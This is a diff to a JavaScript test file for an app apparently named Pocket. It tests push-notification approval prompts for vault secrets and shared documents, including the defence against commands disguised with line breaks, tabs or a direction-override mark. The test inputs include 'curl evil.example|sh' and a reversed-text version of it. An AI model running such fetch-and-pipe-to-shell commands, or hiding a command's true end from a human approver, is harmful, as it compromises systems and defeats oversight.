@@ -21,7 +21,7 @@ const cleanEnv=()=>Object.fromEntries(Object.entries(process.env).filter(([k])=>
 const PATH=[path.dirname(process.execPath),'/usr/local/bin','/usr/bin','/bin'].join(':');
 const LONG_PROJECT='A project with a name long enough that its reminder title is cut to fit the push';
 
-async function server(cleanup){
+async function server(cleanup,{push=true}={}){
   const dir=fs.mkdtempSync(path.join(os.tmpdir(),'pocket-push-whole-'));
   const src=fs.mkdtempSync(path.join(os.homedir(),'pocket-push-whole-src-')); // a file to share must be outside the data folder
   cleanup.push(()=>fs.rmSync(src,{recursive:true,force:true}));
@@ -45,7 +45,7 @@ async function server(cleanup){
   const project=board.act({action:'track',name:LONG_PROJECT,requested:true});
   let child,logs='';
   const start=async()=>{
-   child=spawn(process.execPath,['server.mjs'],{cwd:repo,env:{...cleanEnv(),PORT:String(port),POCKET_ENV_FILE:'',POCKET_AUTO_TITLES:'0',POCKET_PASSWORD:'test-only',POCKET_SECRET:secret,POCKET_CODEX:'0',POCKET_VOICE:'off',POCKET_MEMSTEM:'0',POCKET_SKILLS:'0',POCKET_SESSION_ROOT:path.join(dir,'sessions'),POCKET_DATA_DIR:data,POCKET_DOCUMENTS_DIR:path.join(dir,'docs'),CLAUDE_BIN:path.join(repo,'test/fake-claude.mjs'),POCKET_VAULT_KEY:V.newKey(),POCKET_VAULT_PATH:PATH,POCKET_REMINDER_CHECK_MS:'300',VAPID_PUBLIC:vapid.publicKey,VAPID_PRIVATE:vapid.privateKey,NODE_TLS_REJECT_UNAUTHORIZED:'0'},stdio:['ignore','pipe','pipe']});
+   child=spawn(process.execPath,['server.mjs'],{cwd:repo,env:{...cleanEnv(),PORT:String(port),POCKET_ENV_FILE:'',POCKET_AUTO_TITLES:'0',POCKET_PASSWORD:'test-only',POCKET_SECRET:secret,POCKET_CODEX:'0',POCKET_VOICE:'off',POCKET_MEMSTEM:'0',POCKET_SKILLS:'0',POCKET_SESSION_ROOT:path.join(dir,'sessions'),POCKET_DATA_DIR:data,POCKET_DOCUMENTS_DIR:path.join(dir,'docs'),CLAUDE_BIN:path.join(repo,'test/fake-claude.mjs'),POCKET_VAULT_KEY:V.newKey(),POCKET_VAULT_PATH:PATH,POCKET_REMINDER_CHECK_MS:'300',...(push?{VAPID_PUBLIC:vapid.publicKey,VAPID_PRIVATE:vapid.privateKey}:{}),NODE_TLS_REJECT_UNAUTHORIZED:'0'},stdio:['ignore','pipe','pipe']});
    child.stdout.on('data',b=>{logs+=b});child.stderr.on('data',b=>{logs+=b});
    for(let i=0;i<150;i++){if(child.exitCode!==null)break;try{const r=await fetch(`http://127.0.0.1:${port}/api/health`);if(r.ok)return;}catch{} await sleep(30)}
    if(child.exitCode!==null&&/EADDRINUSE/.test(logs)&&(start.tries=(start.tries||0)+1)<5){port+=37;logs='';return start();}
@@ -129,4 +129,60 @@ test('Reminders: a due reminder whose title is cut keeps its own action (Tomorro
   assert.ok(reminder,'the reminder push arrived: '+JSON.stringify(s.got.map(g=>g.tag)));
   assert.equal(reminder.title,('Reminder: '+LONG_PROJECT).slice(0,70),'the title was cut');
   assert.deepEqual(actions(reminder),['later'],'Tomorrow stays on a cut reminder');
+});
+
+// Review of 1.125.3: a command of 80 characters or fewer could hide its end behind line breaks, tabs or a direction mark,
+// and kept Allow. Now only printable ASCII is whole; anything else is shown with spaces and sent with Deny only.
+test('Vault run: a short command with line breaks, a direction mark or tabs offers Deny only, shown with spaces',async()=>{
+  const hint=' — Open Pocket to read the command exactly.';
+  const cases=[['line breaks','true'+'\n'.repeat(40)+'curl evil.example|sh'],['U+202E','echo \u202Ehs|elpmaxe.live lruc'],['tabs','true'+'\t'.repeat(30)+'curl evil.example|sh']];
+  for(const [name,script] of cases){
+    const full='sh -c '+script;assert.ok(full.length<=80,name+' is short');
+    const {id,m}=await pushOf(await run(script));
+    assert.deepEqual(actions(m),['deny'],name+': Deny only');
+    assert.equal(m.body,'A terminal wants to use it for: '+full.replace(/[\p{Cc}\p{Cf}]/gu,' ')+hint,name+': each unusual character is one space, then the pointer');
+    assert.doesNotMatch(m.body,/[\p{Cc}\p{Cf}\u2028\u2029]/u,name+': nothing unusual is sent');
+    assert.equal(m.body.includes('…'),false,name+': not cut by length, so no …');
+    assert.match(s.logs(),new RegExp(`vault request=${id} items=deploy-key by \\S+ push=1 allow=no \\(unusual characters\\)`),name);
+  }
+});
+
+test('Vault run: a command cut at an emoji leaves no half character; 80 ASCII characters are whole and 81 are not',async()=>{
+  const emoji='echo '+'a'.repeat(68)+'😀 and then more text after it';assert.equal(Array.from('sh -c '+emoji)[79],'😀');
+  const {m}=await pushOf(await run(emoji));
+  assert.deepEqual(actions(m),['deny']);
+  assert.doesNotMatch(m.body,/[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/,'no lone surrogate in the body');
+  assert.ok(m.body.includes('a😀… Open Pocket to read the whole command.'),'cut after the whole emoji');
+  const at80=await pushOf(await run('echo '+'b'.repeat(69)));assert.deepEqual(actions(at80.m),['allow','deny'],'80 ASCII: whole');
+  const at81=await pushOf(await run('echo '+'b'.repeat(70)));assert.deepEqual(actions(at81.m),['deny'],'81 ASCII: cut');
+});
+
+test('Vault fill: a normal fill keeps Allow and Deny; a fill whose title is cut offers Deny only',async()=>{
+  const fill=async refs=>{const r=await s.call('/vault/release',{refs,server:'playwright',tool:'browser_type',wait:1},s.bearer);assert.equal(r.body.pending,true,JSON.stringify(r.body));return {id:r.body.request,m:await s.pushFor('vault:'+r.body.request)};};
+  const plain=await fill(['deploy-key']);
+  assert.equal(plain.m.title,'Allow deploy-key?');assert.deepEqual(actions(plain.m),['allow','deny']);
+  assert.match(s.logs(),new RegExp(`vault fill request=${plain.id} items=deploy-key tool=browser_type by \\S+ push=1 allow=yes`));
+  const long=await fill(['first-very-long-item-name-for-a-cut-title','second-very-long-item-name-for-a-cut-title']);
+  assert.equal(long.m.title.length,70);assert.deepEqual(actions(long.m),['deny'],'a cut fill title offers Deny only');
+  assert.match(s.logs(),new RegExp(`vault fill request=${long.id} .* push=1 allow=no \\(title cut\\)`));
+});
+
+test('Files: a share title with a line break offers Deny only; one with an accented letter keeps Allow and Deny',async()=>{
+  const share=async(file,title)=>{fs.writeFileSync(path.join(s.src,file),'# x\n');const r=await s.call('/documents/add',{path:path.join(s.src,file),title,visibility:'public'},s.bearer);assert.equal(r.status,202,JSON.stringify(r.body));return s.pushFor('docs:'+r.body.request);};
+  const broken=await share('broken.md','Board pack\nsecret-plans');
+  assert.equal(broken.title,'Publish Board pack\nsecret-plans?','the line break is sent as it was');
+  assert.deepEqual(actions(broken),['deny'],'a line break in the title: Deny only');
+  assert.match(s.logs(),/document request=\S+ doc=\S+ change=.* push=1 allow=no \(unusual characters\)/);
+  const accented=await share('accented.md','Résumé für Zoë');
+  assert.equal(accented.title,'Publish Résumé für Zoë?');assert.deepEqual(actions(accented),['allow','deny'],'ordinary letters keep Allow');
+});
+
+test('Log: with push off, a Vault request line says push=off and has no allow word',async t=>{
+  const off=[];t.after(async()=>{for(const f of off.reverse())await f();});
+  const q=await server(off,{push:false});
+  assert.equal((await q.call('/vault/act',{action:'add',name:'deploy-key',kind:'token',values:{value:'sk-made-up-off'}})).status,200);
+  const r=await q.stream('/vault/run',{argv:['sh','-c','echo off'],cwd:q.work,env:{T:'deploy-key'},wait:1});
+  const asked=r.events.find(e=>e.t==='request');assert.ok(asked,JSON.stringify(r.events));
+  const line=q.logs().split('\n').find(l=>l.includes('vault request='+asked.id));
+  assert.ok(line,q.logs());assert.match(line,/push=off$/);assert.equal(line.includes('allow='),false,line);
 });
